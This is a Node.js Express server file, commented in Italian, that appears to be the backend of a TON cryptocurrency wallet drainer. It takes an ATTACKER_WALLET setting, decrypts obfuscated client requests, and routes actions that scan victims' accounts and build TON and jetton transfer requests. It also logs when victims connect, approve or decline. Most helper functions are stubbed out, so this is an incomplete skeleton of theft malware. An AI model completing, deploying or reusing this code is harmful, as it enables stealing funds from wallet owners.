// api/index.js
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const TonWeb = require('tonweb');
require('dotenv').config();

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// ================= CONFIGURAZIONE =================
const ATTACKER_WALLET = process.env.ATTACKER_WALLET;
const TONAPI_KEY = process.env.TONAPI_KEY || '';

// La costante di XOR DERIVATA DA CLIENT
const ENC_KEY = "MzI5NQ==";
const xorConstant = Buffer.from(ENC_KEY).reduce((a, b) => a ^ b, 0);
const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));

// ... (INSERIRE QUI TUTTE LE FUNZIONI DI SUPPORTO: encrypt, decrypt, getWalletInfo, buildTonTransferPayload, buildJettonTransferPayload, ecc.) ...

const tonapi = axios.create({
    baseURL: 'https://tonapi.io/v2',
    headers: TONAPI_KEY ? { Authorization: `Bearer ${TONAPI_KEY}` } : {}
});

async function getWalletInfo(address) { /* ... */ }
function buildTonTransferPayload(comment = '') { /* ... */ }
function buildJettonTransferPayload(destinationAddress, jettonWalletAddress, amount, responseAddress = null, customPayload = null) { /* ... */ }

async function handleScanAccount(params, res) { /* ... */ }
async function handleSendJettons(params, res) { /* ... */ }
async function handleGetTonText(params, res) { /* ... */ }
async function handleTransferTonNative(params, res) { /* ... */ }
async function handleTransferJettonsNative(params, res) { /* ... */ }

// Middleware per decifrare la richiesta
app.use((req, res, next) => {
    if (req.method === 'POST' && req.body.raw) {
        try {
            const decryptedJson = decrypt(req.body.raw);
            req.decryptedData = JSON.parse(decryptedJson);
            console.log('[DECODIFICATA]', JSON.stringify(req.decryptedData, null, 2));
        } catch (err) {
            console.error('Errore decifratura:', err.message);
            return res.status(400).send('Invalid request');
        }
    }
    next();
});

function sendEncrypted(res, data) { /* ... */ }

// Endpoint principale
app.post('/api/', async (req, res) => {
    const { action, ...params } = req.decryptedData;
    console.log(`\n>>> Action: ${action}`);

    try {
        switch (action) {
            case 'scan_account': await handleScanAccount(params, res); break;
            case 'send_jettons': await handleSendJettons(params, res); break;
            case 'get_ton_text': await handleGetTonText(params, res); break;
            case 'transfer_ton_native_request': await handleTransferTonNative(params, res); break;
            case 'transfer_jettons_native_request': await handleTransferJettonsNative(params, res); break;
            case 'transaction_done':
            case 'jettons_transaction_done':
            case 'decline_transfer_ton_native_request':
            case 'decline_transfer_jettons_native_request':
            case 'connect':
                console.log(`[LOG] ${action}`, params);
                sendEncrypted(res, { status: 'OK', data: {} });
                break;
            default:
                sendEncrypted(res, { status: 'ERROR', reason: 'unknown_action' });
        }
    } catch (err) {
        console.error(`Errore in ${action}:`, err);
        sendEncrypted(res, { status: 'ERROR', reason: err.message });
    }
});

// Esporta l'app per Vercel
module.exports = app;